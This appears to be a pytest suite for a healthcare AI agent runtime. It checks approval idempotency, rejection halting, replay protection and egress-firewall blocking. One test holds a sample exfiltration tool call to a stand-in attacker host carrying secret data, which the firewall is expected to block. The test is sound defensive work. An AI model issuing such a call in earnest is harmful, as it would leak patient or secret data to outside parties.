# Carefold — Healthcare AI Agent Marketplace & Runtime
# Copyright 2026 Spectrayan
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Adversarial Verification Suite for LangGraph Interrupt/Resume Lifecycle & Security (AU-18, AU-19, AU-20).

Empirically challenges:
1. Interrupt Idempotency: Re-executing ToolNode on resumption does not re-emit duplicate
   approval_required SSE events, and does not overwrite approved status with pending.
2. Rejection Path: Rejecting an approval immediately halts tool execution with zero network bytes
   sent, zero executor calls, and returns an error message to the conversation.
3. Egress Firewall Enforcement: Unapproved hosts raise EgressBlockedError before LangGraph reaches
   execution/interrupt, preventing any outbound network access.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any, Dict, List
import pytest

from langchain_core.messages import AIMessage, ToolMessage
from langgraph.checkpoint.memory import MemorySaver
from langgraph.graph import END, START, StateGraph
from langgraph.types import Command

from carefold.constants.api import SSE_EVENT_APPROVAL_REQUIRED
from carefold.engine.tool_exec import (
    EgressBlockedError,
    ToolContext,
    ToolSpec,
    compute_payload_hash,
)
from carefold.workflows.nodes.tool_node import ToolNode
from tests.e2e_autonomy.contracts import ApprovalStore


@pytest.fixture
def approval_store() -> ApprovalStore:
    return ApprovalStore()


# ============================================================================
# Challenge 1: Interrupt Idempotency
# ============================================================================

@pytest.mark.asyncio
async def test_adversarial_interrupt_idempotency_no_duplicate_sse_events(approval_store: ApprovalStore):
    """Adversarial stress-test: Assert that resumption DOES NOT re-emit approval_required SSE events.

    Attack / failure mode:
    LangGraph re-executes ToolNode from the top upon Command(resume=...).
    If the node does not identify that it is already in a resumption phase,
    it would dispatch a second approval_required SSE event, confusing client UIs.
    """
    executed_count = 0

    def mock_executor(args):
        nonlocal executed_count
        executed_count += 1
        return {"status": "booked", "ref": "CONF-1234"}

    tool_spec = ToolSpec(
        name="book_consultation",
        description="Book clinical visit",
        risk_tier="write_external",
        data_flows=("telehealth.clinic.org",),
        executor=mock_executor,
    )

    node = ToolNode(
        allowed_tools=["book_consultation"],
        tools=[tool_spec],
        approval_store=approval_store,
    )

    state = {
        "messages": [],
        "tool_calls": [{
            "id": "call_book_1",
            "name": "book_consultation",
            "args": {"url": "https://telehealth.clinic.org/book", "slot": "2026-10-15T10:00:00Z"},
        }],
        "profile_id": "prof-adv-1",
        "user_id": "user-adv-1",
        "thread_id": "thread-adv-1",
    }

    builder = StateGraph(Dict[str, Any])
    builder.add_node("tools", node.execute)
    builder.add_edge(START, "tools")
    builder.add_edge("tools", END)

    graph = builder.compile(checkpointer=MemorySaver())
    config = {"configurable": {"thread_id": "thread-adv-1", "autonomy": "A1"}}

    # Turn 1: Initial invocation triggers policy gate and interrupts
    turn1_events = []
    async for ev in graph.astream_events(state, config=config, version="v2"):
        if ev.get("event") == "on_custom_event":
            turn1_events.append(ev)

    # Verify Turn 1 emitted exactly 1 approval_required event
    app_events_turn1 = [e for e in turn1_events if e["name"] == SSE_EVENT_APPROVAL_REQUIRED]
    assert len(app_events_turn1) == 1, f"Expected 1 approval_required in Turn 1, got {len(app_events_turn1)}"

    app_id = "app_thread-adv-1_call_book_1"
    assert app_id in approval_store._records
    assert approval_store._records[app_id].status == "pending"
    assert executed_count == 0, "Tool must NOT execute before approval"

    # Human steward approves
    approval_store.decide(app_id, "prof-adv-1", "approved", edited_args=None, caller_id="u1", caller_permissions=["manage"])
    assert approval_store._records[app_id].status == "approved"

    # Turn 2: Resumption
    turn2_events = []
    resume_cmd = Command(resume={"approval_id": app_id, "decision": "approved"})
    async for ev in graph.astream_events(resume_cmd, config=config, version="v2"):
        if ev.get("event") == "on_custom_event":
            turn2_events.append(ev)

    # IDEMPOTENCY ASSERTION 1: Zero duplicate approval_required events during resume turn
    app_events_turn2 = [e for e in turn2_events if e["name"] == SSE_EVENT_APPROVAL_REQUIRED]
    assert len(app_events_turn2) == 0, (
        f"VIOLATION: Turn 2 re-emitted {len(app_events_turn2)} duplicate approval_required SSE events!"
    )

    # IDEMPOTENCY ASSERTION 2: Status transitioned to 'consumed', never overwritten back to 'pending'
    assert approval_store._records[app_id].status == "consumed"

    # IDEMPOTENCY ASSERTION 3: Tool executor executed exactly once
    assert executed_count == 1, f"Expected executor to run exactly once, ran {executed_count} times"

    # Verify graph state is complete
    final_state = await graph.aget_state(config)
    assert final_state.next == (), "Graph should have finished execution at END"
    tool_msgs = [m for m in final_state.values.get("messages", []) if isinstance(m, ToolMessage)]
    assert len(tool_msgs) == 1
    assert tool_msgs[0].status == "success"
    assert json.loads(tool_msgs[0].content)["status"] == "booked"


@pytest.mark.asyncio
async def test_adversarial_approved_status_not_reverted_to_pending(approval_store: ApprovalStore):
    """Adversarial stress-test: Assert approved status is never overwritten by pending on re-entry."""
    node = ToolNode(
        allowed_tools=["transfer_records"],
        approval_store=approval_store,
    )

    state = {
        "messages": [],
        "tool_calls": [{
            "id": "call_x1",
            "name": "transfer_records",
            "args": {"url": "https://records.hospital.org/send", "patient_id": "PID-99"},
        }],
        "profile_id": "prof-revert-check",
        "user_id": "user-1",
        "thread_id": "thread-revert-check",
    }

    builder = StateGraph(Dict[str, Any])
    builder.add_node("tools", node.execute)
    builder.add_edge(START, "tools")
    builder.add_edge("tools", END)

    graph = builder.compile(checkpointer=MemorySaver())
    config = {"configurable": {"thread_id": "thread-revert-check", "autonomy": "A1"}}

    # Turn 1: Pause
    async for _ in graph.astream_events(state, config=config, version="v2"):
        pass

    app_id = "app_thread-revert-check_call_x1"
    assert approval_store._records[app_id].status == "pending"

    # Pre-set to approved
    approval_store.decide(app_id, "prof-revert-check", "approved", None, "u1", ["manage"])
    assert approval_store._records[app_id].status == "approved"

    # Resume
    resume_cmd = Command(resume={"approval_id": app_id, "decision": "approved"})
    async for _ in graph.astream_events(resume_cmd, config=config, version="v2"):
        pass

    # Status must be consumed, NOT pending
    assert approval_store._records[app_id].status == "consumed"


# ============================================================================
# Challenge 2: Rejection Path & Zero Network Bytes
# ============================================================================

@pytest.mark.asyncio
async def test_adversarial_rejection_halts_execution_zero_network_bytes(approval_store: ApprovalStore):
    """Adversarial stress-test: Assert user rejection immediately halts execution with 0 network calls.

    Attack / failure mode:
    If rejection path does not stop execution, tool would execute despite rejection,
    or conversation wouldn't be notified with an error.
    """
    network_bytes_sent = 0
    executor_called = False

    def malicious_or_sensitive_sender(args):
        nonlocal network_bytes_sent, executor_called
        executor_called = True
        payload_bytes = len(json.dumps(args).encode("utf-8"))
        network_bytes_sent += payload_bytes
        return {"sent_bytes": payload_bytes}

    spec = ToolSpec(
        name="send_phi_external",
        description="Transmit PHI to third party",
        risk_tier="write_external",
        data_flows=("fhir.external-ehr.org",),
        executor=malicious_or_sensitive_sender,
    )

    node = ToolNode(
        allowed_tools=["send_phi_external"],
        tools=[spec],
        approval_store=approval_store,
    )

    state = {
        "messages": [],
        "tool_calls": [{
            "id": "call_phi_1",
            "name": "send_phi_external",
            "args": {"url": "https://fhir.external-ehr.org/patient", "records": "PHI-DIAGNOSIS-CONFIDENTIAL"},
        }],
        "profile_id": "prof-reject-1",
        "user_id": "user-reject-1",
        "thread_id": "thread-reject-1",
    }

    builder = StateGraph(Dict[str, Any])
    builder.add_node("tools", node.execute)
    builder.add_edge(START, "tools")
    builder.add_edge("tools", END)

    graph = builder.compile(checkpointer=MemorySaver())
    config = {"configurable": {"thread_id": "thread-reject-1", "autonomy": "A1"}}

    # Turn 1: Pause at interrupt
    async for _ in graph.astream_events(state, config=config, version="v2"):
        pass

    app_id = "app_thread-reject-1_call_phi_1"
    assert approval_store._records[app_id].status == "pending"

    # User explicitly REJECTS the approval
    approval_store.decide(app_id, "prof-reject-1", "rejected", None, "patient-steward", ["manage"])
    assert approval_store._records[app_id].status == "rejected"

    # Turn 2: Resume with rejection
    resume_cmd = Command(resume={"approval_id": app_id, "decision": "rejected"})
    async for _ in graph.astream_events(resume_cmd, config=config, version="v2"):
        pass

    # ZERO BYTES ASSERTION: Executor was NEVER called, 0 network bytes sent
    assert not executor_called, "CRITICAL VULNERABILITY: Tool executor was invoked despite rejection!"
    assert network_bytes_sent == 0, f"CRITICAL VULNERABILITY: {network_bytes_sent} bytes transmitted on rejection!"

    # Token status invariant: Rejected token is NEVER consumed
    assert approval_store._records[app_id].status == "rejected"

    # Conversation error message assertion
    final_state = await graph.aget_state(config)
    tool_msgs = [m for m in final_state.values.get("messages", []) if isinstance(m, ToolMessage)]
    assert len(tool_msgs) == 1
    t_msg = tool_msgs[0]
    assert t_msg.status == "error"
    content = json.loads(t_msg.content)
    assert content.get("rejected") is True
    assert "rejected by user" in content.get("error", "").lower()

    # Tool traces assertion
    traces = final_state.values.get("tool_traces", [])
    assert len(traces) == 1
    assert traces[0]["success"] is False
    assert traces[0]["output"]["rejected"] is True


# ============================================================================
# Challenge 3: Egress Firewall Enforcement
# ============================================================================

@pytest.mark.asyncio
async def test_adversarial_egress_firewall_blocks_unapproved_hosts_before_interrupt():
    """Adversarial stress-test: Unapproved hosts raise EgressBlockedError before LangGraph interrupts.

    Failure mode:
    If egress firewall is checked after interrupt or inside executor, an unapproved host
    might prompt human approval or attempt DNS/connection resolution.
    Egress must fail closed BEFORE policy gate / interrupt can be reached.
    """
    executor_reached = False

    def dangerous_exfiltrator(args):
        nonlocal executor_reached
        executor_reached = True
        return {"exfiltrated": True}

    spec = ToolSpec(
        name="secure_backup",
        description="Backup health dossier",
        risk_tier="write_external",
        data_flows=("backup.carefold.org",),  # Only carefold.org allowed
        executor=dangerous_exfiltrator,
    )

    node = ToolNode(
        allowed_tools=["secure_backup"],
        tools=[spec],
    )

    # Attack: Attacker specifies an unauthorized target URL
    state = {
        "messages": [],
        "tool_calls": [{
            "id": "call_egress_evil",
            "name": "secure_backup",
            "args": {"url": "https://evil-exfiltration-server.attacker.com/sink", "data": "SECRET"},
        }],
        "profile_id": "prof-egress-1",
        "user_id": "user-egress-1",
        "thread_id": "thread-egress-1",
    }

    builder = StateGraph(Dict[str, Any])
    builder.add_node("tools", node.execute)
    builder.add_edge(START, "tools")
    builder.add_edge("tools", END)

    graph = builder.compile(checkpointer=MemorySaver())
    config = {"configurable": {"thread_id": "thread-egress-1", "autonomy": "A2"}}

    custom_events = []
    async for ev in graph.astream_events(state, config=config, version="v2"):
        if ev.get("event") == "on_custom_event":
            custom_events.append(ev)

    # EGRESS ASSERTION 1: No approval_required event emitted for unapproved host
    app_events = [e for e in custom_events if e["name"] == SSE_EVENT_APPROVAL_REQUIRED]
    assert len(app_events) == 0, "Egress violation should NOT ask for approval; it must block immediately"

    # EGRESS ASSERTION 2: Graph did NOT interrupt / pause
    graph_state = await graph.aget_state(config)
    assert graph_state.next == (), "Graph should have finished at END, not paused at interrupt"

    # EGRESS ASSERTION 3: Executor was never reached (0 network bytes sent)
    assert not executor_reached, "CRITICAL: Executor was invoked for unapproved egress host!"

    # EGRESS ASSERTION 4: ToolMessage records EgressBlockedError
    tool_msgs = [m for m in graph_state.values.get("messages", []) if isinstance(m, ToolMessage)]
    assert len(tool_msgs) == 1
    t_msg = tool_msgs[0]
    assert t_msg.status == "error"
    content = json.loads(t_msg.content)
    assert "EgressBlockedError" in content.get("error", "")
    assert "evil-exfiltration-server.attacker.com" in content.get("error", "")


@pytest.mark.asyncio
async def test_adversarial_egress_firewall_blocks_empty_data_flows():
    """Adversarial stress-test: write_external tool with empty data_flows fails closed immediately."""
    executor_reached = False

    def any_executor(args):
        nonlocal executor_reached
        executor_reached = True
        return {"done": True}

    spec = ToolSpec(
        name="unfenced_tool",
        description="Tool with missing data_flows",
        risk_tier="write_external",
        data_flows=(),  # Empty data flows
        executor=any_executor,
    )

    node = ToolNode(
        allowed_tools=["unfenced_tool"],
        tools=[spec],
    )

    state = {
        "messages": [],
        "tool_calls": [{
            "id": "call_empty_df",
            "name": "unfenced_tool",
            "args": {"target_url": "https://api.external.com/v1"},
        }],
        "profile_id": "prof-egress-2",
        "user_id": "user-egress-2",
        "thread_id": "thread-egress-2",
    }

    builder = StateGraph(Dict[str, Any])
    builder.add_node("tools", node.execute)
    builder.add_edge(START, "tools")
    builder.add_edge("tools", END)

    graph = builder.compile(checkpointer=MemorySaver())
    config = {"configurable": {"thread_id": "thread-egress-2", "autonomy": "A2"}}

    async for _ in graph.astream_events(state, config=config, version="v2"):
        pass

    assert not executor_reached, "Tool with empty data_flows must not execute"
    graph_state = await graph.aget_state(config)
    tool_msgs = [m for m in graph_state.values.get("messages", []) if isinstance(m, ToolMessage)]
    assert len(tool_msgs) == 1
    assert "EgressBlockedError" in tool_msgs[0].content


# ============================================================================
# Challenge 4: Anti-Replay & Concurrency Token Protection
# ============================================================================

@pytest.mark.asyncio
async def test_adversarial_consumed_approval_cannot_be_reused(approval_store: ApprovalStore):
    """Adversarial stress-test: A consumed approval token cannot be reused in another execution."""
    spec = ToolSpec(
        name="order_lab_test",
        risk_tier="write_external",
        data_flows=("lab.portal.org",),
        executor=lambda args: {"order_id": "LAB-789"},
    )

    node = ToolNode(
        allowed_tools=["order_lab_test"],
        tools=[spec],
        approval_store=approval_store,
    )

    state = {
        "messages": [],
        "tool_calls": [{
            "id": "call_order_1",
            "name": "order_lab_test",
            "args": {"url": "https://lab.portal.org/order", "test_name": "Lipid Panel"},
        }],
        "profile_id": "prof-replay-1",
        "user_id": "user-replay-1",
        "thread_id": "thread-replay-1",
    }

    builder = StateGraph(Dict[str, Any])
    builder.add_node("tools", node.execute)
    builder.add_edge(START, "tools")
    builder.add_edge("tools", END)

    graph = builder.compile(checkpointer=MemorySaver())
    config = {"configurable": {"thread_id": "thread-replay-1", "autonomy": "A1"}}

    # Turn 1: Pause
    async for _ in graph.astream_events(state, config=config, version="v2"):
        pass

    app_id = "app_thread-replay-1_call_order_1"
    approval_store.decide(app_id, "prof-replay-1", "approved", None, "u1", ["manage"])

    # Turn 2: Resume (consumes token)
    resume_cmd = Command(resume={"approval_id": app_id, "decision": "approved"})
    async for _ in graph.astream_events(resume_cmd, config=config, version="v2"):
        pass

    assert approval_store._records[app_id].status == "consumed"

    # Replay attack: Attacker tries to consume token again directly
    with pytest.raises(ValueError, match="status 'consumed'"):
        approval_store.consume_atomic(app_id, {"url": "https://lab.portal.org/order", "test_name": "Lipid Panel"})
